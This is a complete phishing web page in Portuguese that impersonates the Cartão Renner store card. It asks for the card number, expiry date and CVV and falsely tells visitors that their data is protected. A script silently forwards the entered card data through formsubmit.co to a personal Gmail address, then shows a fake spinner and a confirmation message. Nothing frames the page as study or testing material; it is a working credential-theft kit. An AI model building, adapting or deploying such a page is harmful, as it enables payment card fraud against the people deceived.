<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cartão Renner</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
      font-family: 'Roboto', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 360px;
      width: 90%;
      text-align: center;
    }
    .logo {
      width: 120px;
      margin: 0 auto 20px auto;
    }
    h2 {
      color: #c5002e;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      background-color: #c5002e;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #a80025;
    }
    .info, .final {
      font-size: 14px;
      color: #555;
      margin-top: 15px;
    }
    .hidden {
      display: none;
    }
    .loading {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .loading img {
      width: 40px;
      margin-bottom: 15px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <!-- Tela de cadastro -->
  <div class="container" id="formulario">
    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Renner_logo.png" alt="Renner" class="logo">
    <h2>Cartão Renner</h2>
    <form id="cartaoForm">
      <input type="text" name="numero_cartao" placeholder="Número do cartão" required maxlength="19">
      <input type="text" name="validade" placeholder="Validade (MM/AA)" required maxlength="5">
      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required maxlength="4">
      <input type="hidden" name="_captcha" value="false">
      <button type="submit">Confirmar</button>
    </form>
    <p class="info">Seus dados estão protegidos.</p>
  </div>

  <!-- Tela de carregamento -->
  <div class="container hidden" id="carregando">
    <div class="loading">
      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
      <p>Processando seu cadastro...</p>
    </div>
  </div>

  <!-- Tela final -->
  <div class="container hidden" id="final">
    <h2>Cadastro enviado com sucesso!</h2>
    <p class="final">Em breve, um de nossos atendentes entrará em contato com você.</p>
  </div>

  <script>
    const form = document.getElementById("cartaoForm");
    const formulario = document.getElementById("formulario");
    const carregando = document.getElementById("carregando");
    const final = document.getElementById("final");

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      // Esconde o formulário e mostra o carregando
      formulario.classList.add("hidden");
      carregando.classList.remove("hidden");

      // Envia os dados
      const dados = new FormData(form);
      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
        method: "POST",
        headers: { 'Accept': 'application/json' },
        body: dados
      });

      // Simula o carregamento
      setTimeout(() => {
        carregando.classList.add("hidden");
        final.classList.remove("hidden");
      }, 2500);
    });
  </script>
</body>
</html>
